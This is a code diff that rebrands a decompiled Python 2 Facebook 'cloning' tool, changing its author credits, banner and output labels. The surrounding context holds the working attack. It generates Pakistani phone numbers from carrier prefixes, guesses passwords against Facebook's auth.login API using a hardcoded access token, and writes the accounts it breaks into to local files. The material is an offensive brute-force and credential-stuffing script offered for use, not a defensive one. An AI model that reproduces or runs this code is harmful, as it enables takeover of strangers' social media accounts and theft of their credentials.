@@ -1,13 +1,13 @@
 # coding: utf-8
-# Decompiled By Abdul Mateen
-# Github : https://github.com/Metoohacker
+# Decompiled By Z4IN
+# Github : https://github.com/TALIBAN-188
 # uncompyle6 version 
-# Original written By Abdul Mateen
+# Original written By Z4IN
 
 
 import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
 __author__ = 'Mateen'
-__copyright = 'All rights reserved . Copyright  Abdul Mateen'
+__copyright = 'All rights reserved . Copyright  Z4IN
 CorrectUsername = 'Mateen'
 os.system('clear')
 loop = 'true'
@@ -16,12 +16,12 @@ while (loop == 'true'):
     if (username == CorrectUsername):
             print '\033[1;92m Logged in successfully as '
             time.sleep(1)
-            os.system('xdg-open https://www.facebook.com/profile.php?id=100054067120076')
+            os.system('xdg-open https://www.facebook.com/B4LOCH112')
             os.system('clear')
             loop = 'false'
     else:
         print '\033[1;93m Wrong Key !'
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100054067120076')
+        os.system('xdg-open https://www.facebook.com/B4LOCH112')
         os.system('clear')
 done = False
 os.system('rm -rf .txt')
@@ -95,14 +95,14 @@ def tik():
  ##### LOGO ##### 
 logo = """
       ___  ___     _____  ____  ____  ______  
-     /  \/ _ Please __/  
-    / ,_/ _Pray for \\\\\\\
-   /_/_/ Metoo//////////                                                                                          ​                                                                                     
+     /  \/ _ FU*K __/  
+    / ,_/ _PAID TOOL \\\\\\\
+   /_/_/ MAKER//////////                                                                                          ​                                                                                     
  ​______________________________________________
- ​Author   :            Abdul Mateen
- Facebook :          Abdul Mateen
- ​GitHub   :        github.com/MetooHacker
- ​Version  :              0.9
+ ​Author   :            Z4IN
+ Facebook :          Z4IN
+ ​GitHub   :        github.com/TALIBAN-188
+ ​Version  :              0.9
  ​______________________________________________
  ​                                                 """ 
 logo1 = '   \n\n\x1b[4;96mSELECT PAK  SIM CODE \x1b[1;0m\n\x1b[1;96m[1] Jazz    \x1b[1;97m 00,01,02,03,04,05,06,07,08\n\x1b[1;96m[2] Zong    \x1b[1;97m 11,12,13,14,15,16,17\n\x1b[1;96m[3] Warid   \x1b[1;97m 21,22,23,24,25\n\x1b[1;96m[4] Ufone   \x1b[1;97m 30,31,32,33,34,35\n\x1b[1;96m[5] Telenor \x1b[1;97m 40,41,42,43,44,45,46,47\n\n\n\n\x1bx \x1b[1;97m\x1b[1;0m\n'
@@ -173,7 +173,7 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[92m  [MATEEN_OK]  ' + k + c + user + '  |  ' + pass1
+                print '\x1b[92m  [Z4IN_OK]  ' + k + c + user + '  |  ' + pass1
                 okb = open('save/CP.txt', 'a')
                 okb.write(k + c + user + pass1 + '\n')
                 okb.close()
@@ -189,13 +189,13 @@ def action():
                 data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\x1b[1;92m  [MATEEN_OK] ' + k + c + user + '  |  ' + pass2
+                    print '\x1b[1;92m  [Z4IN_OK] ' + k + c + user + '  |  ' + pass2
                     okb = open('save/OK.txt', 'a')
                     okb.write(k + c + user + pass2 + '\n')
                     okb.close()
                     oks.append(c + user + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\x1b[1;92m  [Mateen_OK] ' + k + c + user + '  |  ' + pass2
+                    print '\x1b[1;92m  [Z4IN_OK] ' + k + c + user + '  |  ' + pass2
                     cps = open('save/CP.txt', 'a')
                     cps.write(k + c + user + pass2 + '\n')
                     cps.close()
@@ -205,13 +205,13 @@ def action():
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\x1b[1;92m  [Mateen_OK]  ' + k + c + user + '  |  ' + pass3
+                        print '\x1b[1;92m  [Z4IN_OK]  ' + k + c + user + '  |  ' + pass3
                         okb = open('save/CP.txt', 'a')
                         okb.write(k + c + user + pass3 + '\n')
                         okb.close()
                         oks.append(c + user + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\x1b[1;92m  [MATEEN_OK] ' + k + c + user + '  |  ' + pass3
+                        print '\x1b[1;92m  [Z4IN_OK] ' + k + c + user + '  |  ' + pass3
                         cps = open('save/CP.txt', 'a')
                         cps.write(k + c + user + pass3 + '\n')
                         cps.close()
@@ -229,7 +229,7 @@ def action():
     print 'Total CP : ' + str(len(cpb))
     print(47*"-")
     print 'Cloned Accounts Has Been Saved : save/cloned.txt'
-    jalan('Note : Cp account  10 say 12 days BAD OPEN KRY')
+    jalan('Note : USE FLIGHT MOOD BEFORE LOGIN CLONE YOUR PROVINCE LIST')
     raw_input('\n\x1b[1;95m[\x1b[1;98mMetoo_menu_Back\x1b[1;95m]')
     login()
 
